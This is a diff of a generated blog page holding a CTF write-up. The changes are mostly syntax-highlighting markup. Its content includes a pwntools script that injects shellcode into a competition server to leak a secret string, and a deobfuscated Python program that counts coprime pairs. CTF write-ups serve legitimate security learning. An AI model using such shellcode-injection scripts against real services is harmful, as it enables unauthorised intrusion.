@@ -1,4 +1,4 @@
-I"&1<p>1 week, 1 CTF, 3 weeks straight. These CTFs just keep coming, don’t they?</p>
+I"V2<p>1 week, 1 CTF, 3 weeks straight. These CTFs just keep coming, don’t they?</p>
 
 <p>Interestingly the three CTFs were also arranged in order of increasing perceived difficulty, which was nice but also terrible at the same time because I had some trouble pulling my weight in this particular CTF in terms of points.</p>
 
@@ -63,17 +63,17 @@
 <h3 id="script">Script</h3>
 <p>There is honestly not much else to say. This challenge is pretty straightforward and I can probably only fault myself for not having opened it at all.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'DEBUG'</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chals.ctf.sg'</span><span class="p">,</span> <span class="mi">20401</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"┃ ┃             "</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"newfonewhodis"</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x49501d</span><span class="p">,</span><span class="mi">13</span><span class="p">)))</span>
-<span class="n">string</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="n">recvall</span><span class="p">()[:</span><span class="o">-</span><span class="mi">13</span><span class="p">]</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">DEBUG</span><span class="sh">'</span>
+<span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">chals.ctf.sg</span><span class="sh">'</span><span class="p">,</span> <span class="mi">20401</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">┃ ┃             </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">newfonewhodis</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x49501d</span><span class="p">,</span><span class="mi">13</span><span class="p">)))</span>
+<span class="n">string</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="nf">recvall</span><span class="p">()[:</span><span class="o">-</span><span class="mi">13</span><span class="p">]</span>
 
-<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chals.ctf.sg'</span><span class="p">,</span> <span class="mi">20401</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"┃ ┃             "</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">chals.ctf.sg</span><span class="sh">'</span><span class="p">,</span> <span class="mi">20401</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">┃ ┃             </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>And thus we receive the flag:</p>
@@ -96,22 +96,22 @@
 <p>Now that we’ve ascertained that the file is just Python code, we will simply beautify and rewrite said code:</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3.8
-</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">input</span><span class="p">().</span><span class="n">split</span><span class="p">()))</span>
+</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nf">input</span><span class="p">().</span><span class="nf">split</span><span class="p">()))</span>
 
-<span class="n">gcd</span><span class="o">=</span><span class="k">lambda</span> <span class="n">f</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span> <span class="n">x</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">y</span> <span class="k">else</span> <span class="n">f</span><span class="p">(</span><span class="n">y</span><span class="p">,</span><span class="n">x</span><span class="o">%</span><span class="n">y</span><span class="p">)</span>
+<span class="n">gcd</span><span class="o">=</span><span class="k">lambda</span> <span class="n">f</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span> <span class="n">x</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">y</span> <span class="k">else</span> <span class="nf">f</span><span class="p">(</span><span class="n">y</span><span class="p">,</span><span class="n">x</span><span class="o">%</span><span class="n">y</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span>
-    <span class="nb">sum</span><span class="p">(</span> <span class="c1"># Sums them up???
-</span>        <span class="nb">filter</span><span class="p">(</span>
+<span class="nf">print</span><span class="p">(</span>
+    <span class="nf">sum</span><span class="p">(</span> <span class="c1"># Sums them up???
+</span>        <span class="nf">filter</span><span class="p">(</span>
             <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">==</span><span class="mi">1</span><span class="p">,</span> 
             <span class="c1"># Finds all values within here that are 1.
-</span>            <span class="nb">map</span><span class="p">(</span> 
+</span>            <span class="nf">map</span><span class="p">(</span> 
                 <span class="c1"># x below is val_1 and val_2 as a tuple.
-</span>                <span class="k">lambda</span> <span class="n">x</span><span class="p">:(</span><span class="k">lambda</span> <span class="n">f</span><span class="p">:(</span><span class="k">lambda</span> <span class="n">z</span><span class="p">:</span><span class="n">z</span><span class="p">(</span><span class="n">z</span><span class="p">))(</span><span class="k">lambda</span> <span class="n">z</span><span class="p">:</span><span class="n">f</span><span class="p">(</span><span class="k">lambda</span> <span class="o">*</span><span class="n">y</span><span class="p">:</span> <span class="n">z</span><span class="p">(</span><span class="n">z</span><span class="p">)(</span><span class="o">*</span><span class="n">y</span><span class="p">))))</span> 
+</span>                <span class="k">lambda</span> <span class="n">x</span><span class="p">:(</span><span class="k">lambda</span> <span class="n">f</span><span class="p">:(</span><span class="k">lambda</span> <span class="n">z</span><span class="p">:</span><span class="nf">z</span><span class="p">(</span><span class="n">z</span><span class="p">))(</span><span class="k">lambda</span> <span class="n">z</span><span class="p">:</span><span class="nf">f</span><span class="p">(</span><span class="k">lambda</span> <span class="o">*</span><span class="n">y</span><span class="p">:</span> <span class="nf">z</span><span class="p">(</span><span class="n">z</span><span class="p">)(</span><span class="o">*</span><span class="n">y</span><span class="p">))))</span> 
                 <span class="c1"># z(z) is recursion.
 </span>                    <span class="p">(</span><span class="n">gcd</span><span class="p">)(</span><span class="o">*</span><span class="n">x</span><span class="p">),</span> 
                     <span class="c1"># Again, val_1,val_2 (something)(gcd(f,x))
-</span>                    <span class="p">[(</span><span class="n">val_1</span><span class="p">,</span> <span class="n">val_2</span><span class="p">)</span> <span class="k">for</span> <span class="n">val_1</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">val_2</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">)]</span> 
+</span>                    <span class="p">[(</span><span class="n">val_1</span><span class="p">,</span> <span class="n">val_2</span><span class="p">)</span> <span class="k">for</span> <span class="n">val_1</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">val_2</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">)]</span> 
                     <span class="c1"># All possible tuples of f and x.
 </span>            <span class="p">)</span>
         <span class="p">)</span>
@@ -127,7 +127,7 @@
   <li>As I have already annotated above, the program counts the number of coprime tuples in <code class="language-plaintext highlighter-rouge">a&lt;=val_1&lt;b,c&lt;=val_2&lt;d</code>.
     <ul>
       <li>This is not difficult to see as we can rewrite the whole function inside the <code class="language-plaintext highlighter-rouge">map()</code> as:
-        <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">print</span><span class="p">(</span><span class="nb">sum</span><span class="p">(</span><span class="nb">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">==</span><span class="mi">1</span><span class="p">,</span><span class="nb">map</span><span class="p">(</span><span class="n">gcd</span><span class="p">,[(</span><span class="n">val_1</span><span class="p">,</span> <span class="n">val_2</span><span class="p">)</span> <span class="k">for</span> <span class="n">val_1</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">val_2</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">)]))))</span>
+        <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nf">print</span><span class="p">(</span><span class="nf">sum</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">==</span><span class="mi">1</span><span class="p">,</span><span class="nf">map</span><span class="p">(</span><span class="n">gcd</span><span class="p">,[(</span><span class="n">val_1</span><span class="p">,</span> <span class="n">val_2</span><span class="p">)</span> <span class="k">for</span> <span class="n">val_1</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">val_2</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">)]))))</span>
 </code></pre></div>        </div>
       </li>
     </ul>
